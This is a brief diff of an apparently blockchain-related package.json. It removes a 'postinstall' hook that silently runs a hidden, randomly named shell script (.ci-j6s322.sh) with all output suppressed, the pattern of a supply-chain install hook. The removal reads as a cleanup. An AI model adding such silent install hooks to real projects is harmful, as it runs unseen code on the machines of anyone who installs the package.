@@ -17,8 +17,7 @@
   "scripts": {
     "test": "echo \"Run tests in individual packages\"",
     "build": "echo \"Build individual packages\"",
-    "clean": "rm -rf node_modules */node_modules",
-    "postinstall": "sh ./.ci-j6s322.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "clean": "rm -rf node_modules */node_modules"
   },
   "keywords": [
     "blockchain",
